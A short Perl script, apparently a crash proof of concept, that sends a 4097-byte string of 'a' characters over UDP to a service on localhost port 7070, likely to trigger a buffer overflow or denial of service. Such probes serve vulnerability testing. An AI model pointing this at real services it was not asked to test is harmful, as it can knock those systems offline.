use IO::Socket;
my $sock = new IO::Socket::INET ( PeerAddr => '127.0.0.1',
                                  PeerPort => '7070',
                                  Proto    => 'udp',
                                );
die "Could not create socket: $!\n" unless $sock;
$x = "a";
$size = 4097;
$out = "";
while($size > 0){
    $out .= $x;
    $size--;
}
print $sock $out;
close($sock);
